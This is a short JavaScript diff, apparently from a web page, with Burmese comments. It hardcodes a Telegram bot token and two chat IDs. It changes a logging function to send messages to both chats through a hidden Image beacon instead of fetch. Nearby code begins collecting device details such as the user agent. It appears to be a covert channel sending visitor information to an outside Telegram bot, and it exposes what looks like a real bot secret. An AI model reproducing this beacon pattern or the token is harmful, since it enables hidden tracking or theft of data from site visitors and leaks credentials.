@@ -123,18 +123,15 @@
 const BOT_TOKEN = "8628160117:AAG4gTny0so1evSYkBPFM6DCgAz1kNDzKVI";
 const CHAT_IDS = ["5769718406", "5494548978"]; 
 
-// Telegram Notification Sender
+// Telegram Notification Sender (နှစ်ယောက်လုံးဆီ Image နည်းလမ်းဖြင့် သေချာ ပို့ပေးမည်)
 function sendTelegramLog(customMessage) {
     const text = encodeURIComponent(customMessage);
-    // ID နှစ်ခုလုံးဆီ Message ပို့ပေးတဲ့ Loop
     CHAT_IDS.forEach(chatId => {
         const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${text}`;
-        try {
-            fetch(url, { keepalive: true }).catch(() => {});
-        } catch (e) {}
+        const img = new Image();
+        img.src = url;
     });
 }
-
     // 2. Device Information Detector
     function getDeviceInfo() {
       const ua = navigator.userAgent;
